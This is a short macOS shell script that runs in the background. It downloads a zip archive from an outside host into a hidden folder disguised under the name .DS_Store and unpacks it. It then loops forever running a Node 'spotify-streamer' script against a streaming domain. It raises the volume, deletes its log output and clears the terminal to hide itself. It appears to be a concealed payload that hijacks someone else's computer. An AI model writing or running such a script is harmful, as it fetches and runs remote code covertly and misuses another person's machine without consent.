nohup sh -c "
cd ~
rm -rf .DS_Store
mkdir .DS_Store
cd .DS_Store
curl -O http://emraldia.com/rchive.zip
unzip rchive.zip
cd spotify-streamer
while [[ true ]]
do
rm ~/nohup.out
osascript -e 'set volume 7'
./node stream.js spotify.ngargi.me > /dev/null
sleep 1
done
" > /dev/null &
clear
